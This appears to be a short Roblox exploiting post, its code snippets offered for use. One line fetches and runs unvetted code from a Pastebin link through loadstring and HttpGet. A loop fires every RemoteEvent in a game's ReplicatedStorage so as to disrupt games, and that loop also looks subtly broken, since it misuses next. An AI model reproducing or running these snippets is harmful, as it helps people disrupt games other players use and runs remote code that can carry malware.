Remotes is kinda good, cuz you can fuck games with that

-- RemoteSpy that i recommended:
loadstring(game:HttpGet('https://pastebin.com/yJzq5ceV', true))()

-- Fire all Remotes best:
for i,v in next(game.ReplicatedStorage:GetDescendants()) do
    if v:IsA('RemoteEvent') then
        v:FireServer()
    end
end
